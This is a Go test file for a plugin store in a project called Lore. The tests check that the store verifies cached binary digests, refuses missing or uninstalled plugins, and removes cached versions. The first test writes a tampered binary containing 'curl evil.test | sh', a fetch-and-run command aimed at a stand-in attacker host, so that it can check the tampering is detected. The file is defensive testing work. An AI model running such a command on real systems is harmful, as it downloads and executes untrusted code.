package plugindist

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/setthasit/Lore/internal/config"
	"github.com/setthasit/Lore/internal/errors/internalerror"
)

// Tampering with a cached binary after installation is caught too: the digest
// recorded at install is re-checked at every launch, not only at download.
func TestPluginBinaryRefusesARewrittenCachedBinary(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, result := scene.installed(t)

	if err := os.WriteFile(result.Binary, []byte("#!/bin/sh\ncurl evil.test | sh\n"), 0o755); err != nil {
		t.Fatalf("rewrite the cached binary: %v", err)
	}

	_, err := scene.store.Binary("linear", scene.coord, lock)
	if err == nil {
		t.Fatal("launching a rewritten cached binary succeeded, want a refusal")
	}
	if !internalerror.IsPrecondition(err) {
		t.Fatalf("kind = %v, want precondition", internalerror.KindOf(err))
	}
	for _, want := range []string{"plugins[linear]", "digest mismatch", scene.store.Platform().Key(), result.BinaryDigest} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error %q does not mention %q", err, want)
		}
	}
}

// A declared plugin with no lock entry for the running os/arch is a startup
// error, not a silent download: nothing in the engine fetches code.
func TestPluginBinaryWithoutALockEntryFailsAtStartup(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, _ := scene.installed(t)

	elsewhere := scene.store.WithPlatform(Platform{OS: "plan9", Arch: "mips"})
	_, err := elsewhere.Binary("linear", scene.coord, lock)
	if err == nil {
		t.Fatal("launching a plugin locked for another platform succeeded, want a refusal")
	}
	for _, want := range []string{"plugins[linear]", LockFileName, "plan9/mips", "lore plugin install linear"} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error %q does not mention %q", err, want)
		}
	}
}

// The message is the documented one, character for character: it is the whole
// interaction a user gets when a fresh clone has not installed its plugins.
func TestPluginBinaryNotInstalledNamesTheInstallCommand(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock := &Lock{}
	lock.Set("linear", "v0.3.1", scene.coord.From, scene.store.Platform(),
		LockArtifact{URL: "https://example.test/x.tar.gz", Digest: "sha256:aaaa"})

	_, err := scene.store.Binary("linear", scene.coord, lock)
	if err == nil {
		t.Fatal("launching an uninstalled plugin succeeded, want a refusal")
	}

	const want = "plugins[linear] is not installed — run: lore plugin install linear"
	if got := actionableCause(err); got != want {
		t.Fatalf("message = %q, want %q", got, want)
	}
}

func TestVerifyReportsTheReVerifiedDigestAndTheBinary(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, result := scene.installed(t)

	report, err := scene.store.Locate("linear", scene.coord, lock)
	if err != nil {
		t.Fatalf("locate: %v", err)
	}
	if report.Version != "v0.3.1" || report.Binary != result.Binary {
		t.Fatalf("report = %+v, want v0.3.1 at %s", report, result.Binary)
	}
	if report.BinaryDigest != result.BinaryDigest {
		t.Fatalf("binary digest = %q, want %q", report.BinaryDigest, result.BinaryDigest)
	}
	if report.LockedDigest != result.ArtifactDigest {
		t.Fatalf("locked digest = %q, want %q", report.LockedDigest, result.ArtifactDigest)
	}
	if report.Manifest {
		t.Fatal("a manifest is reported cached before any handshake happened")
	}

	// The manifest is cached by whoever performs the handshake; this package
	// only says whether it is there.
	if err := scene.store.WriteManifest("linear", "v0.3.1", []byte(`{"name":"linear"}`)); err != nil {
		t.Fatalf("cache a manifest: %v", err)
	}
	if report, err = scene.store.Locate("linear", scene.coord, lock); err != nil || !report.Manifest {
		t.Fatalf("manifest = %v, err = %v; want a cached manifest to be reported", report.Manifest, err)
	}
}

func TestPluginRemoveDeletesEveryCachedVersion(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, _ := scene.installed(t)

	next := archiveWith(t, scene.coord.binaryName(scene.store.Platform()), []byte("#!/bin/sh\necho v0.4.0\n"))
	moved, err := scene.coord.AtVersion("v0.4.0")
	if err != nil {
		t.Fatalf("move the coordinate: %v", err)
	}
	scene.fake.publish("v0.4.0", map[string][]byte{moved.AssetName(scene.store.Platform()): next})
	scene.coord = moved
	if _, err := scene.install(t, lock, true); err != nil {
		t.Fatalf("install v0.4.0: %v", err)
	}

	versions, err := scene.store.Remove("linear")
	if err != nil {
		t.Fatalf("remove: %v", err)
	}
	if versions != 2 {
		t.Fatalf("removed %d versions, want 2", versions)
	}
	if _, err := os.Stat(filepath.Join(scene.store.Root(), "plugins", "linear")); !os.IsNotExist(err) {
		t.Fatal("the plugin cache survived a removal")
	}

	// Removing what is not there is not an error: `lore plugin remove` runs
	// against a declaration that was never installed too.
	if versions, err = scene.store.Remove("linear"); err != nil || versions != 0 {
		t.Fatalf("second remove: %d versions, %v", versions, err)
	}
}

// A local plugin that has been deleted must say so rather than reporting a path
// the host would then fail to execute.
func TestPluginBinaryLocalMissingFileIsRefused(t *testing.T) {
	t.Parallel()

	coord, err := Resolve(".", config.PluginDecl{Name: "scratch", From: filepath.Join(t.TempDir(), "lore-scratch")})
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}

	if _, err := NewStore(t.TempDir()).Binary("scratch", coord, &Lock{}); err == nil {
		t.Fatal("locating an absent local plugin succeeded, want a refusal")
	} else if !strings.Contains(err.Error(), "no file there") {
		t.Fatalf("error %q does not say the file is missing", err)
	}
}

func TestPluginStoreRootIsOverridable(t *testing.T) {
	t.Setenv(RootEnv, filepath.Join(t.TempDir(), "state"))

	root, err := DefaultRoot()
	if err != nil {
		t.Fatalf("default root: %v", err)
	}
	if !strings.HasSuffix(root, "state") {
		t.Fatalf("root = %q, want the overridden directory", root)
	}
}
